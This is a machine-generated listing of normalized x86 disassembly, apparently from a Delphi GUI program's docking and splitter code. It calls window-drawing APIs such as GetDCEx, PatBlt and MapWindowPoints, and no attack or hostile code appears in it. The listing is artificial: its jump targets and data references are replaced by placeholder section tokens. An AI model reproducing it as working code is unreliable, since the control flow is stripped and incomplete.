push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_43e9b8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_43ea10
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_43ea10
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_43eb74
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ecca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_433ce8
mov eax [ ebp - 0x4 ]
call sub_420114
xor eax eax
push ebp
push sub_43ecad
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_420440
xor eax eax
push ebp
push sub_43ec90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_438618
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ec97
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420440
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4385dc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434aac
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43ecd8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_43a418
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_434b54
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_434b10
mov ecx eax
xor edx edx
xor eax eax
call sub_4156e4
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43b8e8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41570c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_43ee4c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43ee4c
pop ecx
mov eax ebx
call sub_403164
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43ee4c
pop ecx
sub_43ee80
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_43ee4c
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403164
xor eax eax
mov [ esi + 0x64 ] eax
sub_43eedc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43deec
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_43ef18
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ef18
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43f185
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c20
mov edx [ ebp - 0x8 ]
pop eax
call sub_404164
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov eax [ ebx + 0x14 ]
call sub_43d678
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c20
mov edx [ ebp - 0x10 ]
pop eax
call sub_404164
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f18c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ec0
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_43da28
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_43dba0
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_43dbdc
mov eax [ ebx + 0x18 ]
call sub_43da28
mov [ edx + 0x18 ] eax
push esi
push sub_43f728
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43df54
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_43dbdc
mov eax [ esi + 0x64 ]
call sub_43dba0
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403164
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_43f700
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403164
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_43d724
mov edx eax
mov eax edi
call sub_43dbc8
mov eax edi
call sub_43da28
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_43f728
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43df54
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_43f728
mov edx [ eax + 0x14 ]
mov eax esi
call sub_43df54
mov eax [ ebx + 0x14 ]
call sub_403164
mov eax edi
call sub_403164
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_43f194
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_43a418
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407c60
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_43dbc8
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43a384
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_43dbc8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_43f5b0
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_43f728
xor edx edx
mov eax edi
call sub_43df54
sub_43f270
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43dba0
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402994
mov edx eax
mov eax ebx
call sub_43dbc8
sub_43f2ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40434c
xor eax eax
push ebp
push sub_43f317
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40415c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f31e
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43f324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43f3d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43d930
mov eax [ ebp - 0x8 ]
call sub_43f2ac
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_43f324
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f3da
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_43f324
pop ecx
sub_43f3e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43f519
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43f4c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43a384
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f4cf
mov eax [ ebp - 0x10 ]
call sub_403164
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43f2ac
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43a398
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_43f4cf
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_43f324
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f520
lea eax [ ebp - 0x14 ]
call sub_403e9c
retn
sub_43f528
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43dc78
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43dca0
call sub_43f528
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43dc78
call sub_43f528
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_43d6a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_43dba0
mov edx eax
mov eax ebx
call sub_43dbc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43dbc8
jmp r-xdata
sub_43f5b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_43f528
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_43f5f4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43dba0
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_43dbc8
sub_43f624
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43b8e8
mov edx eax
mov eax [ rw-data ]
call sub_440184
mov eax [ ebx + 0x14 ]
call sub_43b8e8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_43f738
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f684
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_440184
mov eax ebx
call sub_43f738
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_43dbc8
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_43dbc8
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43f5b0
push ebx
push sub_43f728
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43df54
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_43f700
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_43a384
test eax eax
jle r-xdata
push ebx
push sub_43f728
xor edx edx
mov eax ebx
call sub_43df54
sub_43f738
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_43d76c
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_43d76c
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_43d7d8
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_43d7d8
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41fcf4
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_43f824
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43f824
pop ecx
mov eax ebx
call sub_43dba0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43dba0
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43f824
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43dba0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_424dac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_43f8b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43dba0
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43d724
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_43dba0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_43f824
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f904
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_434aac
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434aac
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_43f980
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43d630
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_43d6dc
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_43dc84
test eax eax
je r-xdata
mov eax esi
call sub_43d6a8
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43f728
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_43df54
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43dc84
mov edx [ ebx + 0x20 ]
call sub_43dbdc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_43f980
pop ecx
sub_43fa00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43d68c
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_43d68c
dec eax
jne r-xdata
test bl bl
